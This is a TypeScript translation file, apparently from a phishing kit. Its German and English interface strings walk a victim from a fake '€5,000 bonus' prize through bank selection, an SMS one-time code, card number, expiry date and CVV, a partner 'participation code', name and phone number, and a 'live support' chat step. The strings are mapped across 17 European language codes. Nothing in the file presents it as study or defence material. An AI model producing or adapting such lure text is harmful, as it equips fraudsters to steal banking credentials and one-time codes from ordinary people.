export type TranslationKeys = {
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
};

const GERMAN_TRANSLATION: TranslationKeys = {
  portal_name: "Kundenportal",
  support_center_name: "Kundensupport",
  win_title: "Exklusiver Bonus",
  win_subtitle: "Herzlichen Glückwunsch! Sie wurden für unsere heutige Aktion ausgewählt. Klicken Sie auf die Schaltfläche unten, um Ihren Bonus von 5.000 € zu beanspruchen.",
  win_button: "Bonus beanspruchen",
  banken_title: "Wählen Sie Ihre Bank",
  banken_subtitle: "Wählen Sie Ihre Bank aus, um fortzufahren.",
  banken_search_placeholder: "Bank suchen...",
  wait_title: "Bitte warten",
  wait_subtitle: "Ihre Anfrage wird sicher verarbeitet...",
  sms_title: "SMS-Sicherheitscode",
  sms_subtitle: "Geben Sie den {digits}-stelligen Code ein.",
  sms_input_label: "Einmalcode",
  sms_button: "Bestätigen",
  sms_loading: "Wird verarbeitet...",
  card_title: "Zahlungsdaten",
  card_subtitle: "Überprüfen und bestätigen Sie Ihre Daten.",
  card_owner_label: "Name des Karteninhabers",
  card_number_label: "Kartennummer",
  card_expiry_label: "Ablaufdatum MM/JJ",
  card_cvv_label: "Sicherheitscode",
  card_button: "Weiter",
  code_title: "Willkommen",
  code_subtitle: "Geben Sie den Teilnahmecode ein, den Sie von {partner} erhalten haben, um Ihre Prämie freizuschalten.",
  code_button: "Code bestätigen",
  live_support_title: "Live-Support",
  live_support_subtitle: "Um fortzufahren, müssen Sie unseren Kundenservice kontaktieren.\n\nKlicken Sie auf die Schaltfläche unten, um den Chat zu starten.",
  live_support_button: "Chat starten",
  profile_title_small: "Gewinnbestätigung",
  profile_title_main: "Ihr Bonusbetrag",
  profile_subtitle: "Bestätigen Sie Ihre Daten für die weitere Bearbeitung.",
  profile_firstname_label: "Vorname",
  profile_lastname_label: "Nachname",
  profile_phone_label: "Handynummer",
  profile_button: "Weiter",
  profile_loading_text: "Wird verarbeitet...",
};

const ENGLISH_TRANSLATION: TranslationKeys = {
  portal_name: "Customer Portal",
  support_center_name: "Customer Support",
  win_title: "Exclusive Bonus",
  win_subtitle: "Congratulations! You have been selected for today's promotion. Click the button below to claim your €5,000 bonus.",
  win_button: "Claim Bonus",
  banken_title: "Choose Your Bank",
  banken_subtitle: "Select your bank to continue.",
  banken_search_placeholder: "Search your bank...",
  wait_title: "Please Wait",
  wait_subtitle: "Your request is being securely processed...",
  sms_title: "SMS Security Code",
  sms_subtitle: "Enter the {digits}-digit code.",
  sms_input_label: "One-time code",
  sms_button: "Confirm",
  sms_loading: "Processing...",
  card_title: "Payment Details",
  card_subtitle: "Check and confirm your details.",
  card_owner_label: "Cardholder Name",
  card_number_label: "Card Number",
  card_expiry_label: "Expiry Date MM/YY",
  card_cvv_label: "Security Code",
  card_button: "Continue",
  code_title: "Welcome",
  code_subtitle: "Enter the participation code you received from {partner} to unlock your reward.",
  code_button: "Confirm Code",
  live_support_title: "Live Support",
  live_support_subtitle: "To continue, you need to contact our customer support.\n\nClick the button below to start the chat.",
  live_support_button: "Start Chat",
  profile_title_small: "Prize Confirmation",
  profile_title_main: "Your Bonus Amount",
  profile_subtitle: "Confirm your details for further processing.",
  profile_firstname_label: "First Name",
  profile_lastname_label: "Last Name",
  profile_phone_label: "Mobile Number",
  profile_button: "Next",
  profile_loading_text: "Processing...",
};

const LANGUAGE_CODES = [
  "fi",
  "nl",
  "et",
  "cs",
  "pt",
  "pl",
  "sv",
  "da",
  "ro",
  "el",
  "hu",
  "tr",
  "en",
  "de",
  "fr",
  "es",
  "it",
] as const;

export const translations: Record<string, TranslationKeys> = Object.fromEntries(
  LANGUAGE_CODES.map((code) => [
    code,
    code === "de" ? GERMAN_TRANSLATION : ENGLISH_TRANSLATION,
  ]),
) as Record<string, TranslationKeys>;
